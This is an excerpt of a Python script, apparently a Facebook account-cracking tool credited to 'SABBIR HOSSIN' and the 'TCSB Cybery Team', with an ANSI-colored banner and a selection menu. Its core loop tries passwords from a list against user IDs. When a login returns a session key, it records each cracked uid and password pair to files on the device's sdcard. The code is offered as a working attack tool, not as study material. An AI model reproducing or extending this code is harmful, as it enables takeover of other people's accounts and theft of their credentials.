...
\033[1;32m     \033[1;36mCREATED BY\33[0;m   :  \033[1;34mTCSB\33[0;m\033[1;31m Cybery \033[1;30mTeam\33[0;m
\033[1;32m     \033[1;33mAUTHOR       :  \033[1;36 SABBIR HOSSIN
\033[1;32m     \033[1;34mGITHUB       :  \033[1;33 SABBIR-6T9
...
def awmafghan():
		...
		#os.system('xdg-open   https://www.facebook.com/SABBIR6T9090')
		print('\033[1;33m------------------------------------------------')
		pcs = input(' [?] SELECT: ')
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/SABBIR-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [SABBIR-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/SABBIR-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [SABBIR-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SABBIR-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
